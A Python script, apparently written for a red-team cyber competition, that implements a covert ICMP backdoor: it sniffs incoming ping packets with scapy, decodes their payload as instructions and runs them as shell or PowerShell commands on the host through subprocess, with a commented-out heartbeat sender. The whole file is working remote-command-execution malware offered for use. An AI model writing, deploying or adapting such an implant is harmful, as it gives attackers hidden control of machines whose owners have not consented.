from scapy.all import *
import subprocess as sp
import threading
import sys
cmn_cmds = []
verbose = False

def cmd_mon(pkt):
    if str(pkt.getlayer(ICMP).type) == "8":
        print(pkt.show())
        print(pkt.getlayer(ICMP).type)
        instruct = pkt.getlayer(ICMP).load.decode()
        cmd_proc(instruct)


def cmd_proc(cmd):
    global verbose
    prefix = cmd[0]
    term = cmd[1]
    cmd = cmd[3::]
    if prefix == "a":
        if term == "c":
            print("A")
        elif term == "p":
            print("A")
    elif prefix == "e":
        if term == "c":#Using this as current test subject is linux
            cmd = cmd.split(" ")
            result = sp.run(cmd, capture_output=True)
            if result.check_returncode() is None and verbose:
                print(result.stdout.decode())
        elif term == "p":
            cmd = cmd.split(" ")
            cmd.insert(0, "powershell")
            result = sp.run(cmd, capture_output=True)
            if result.check_returncode() is None and verbose:
                print(result.stdout.decode())
        elif term == "s":
            print("This taps into the stored commands")


""" May have to be from the server due to the fact that ping will be blocked in a competition on the inbound traffic 
Or just checking to see if a response is recieved. IDK honestly. Gotta spend time drawing this out 
def heart():
    n = 1
    print("TheLoaded RICK")
    #while True:
    send(IP(dst="1.1.1.1")/ ICMP() / "test")
    print("BEAT" + str(n))
    n += 1
    #time.sleep(15)
"""


def sniffer():
    sniff(filter="icmp", prn=cmd_mon)


def main():
    global verbose
    try:
        if sys.argv[1] == "-v":
            verbose = True
    finally:
        print("Loaded Rick")
        #t1 = threading.Thread(target=heart)
        t2 = threading.Thread(target=sniffer)
        #t1.start()
        t2.start()
        #t1.join()
        t2.join()

#cmd_proc("ep Get-LocalUser -Name Guest")
main()
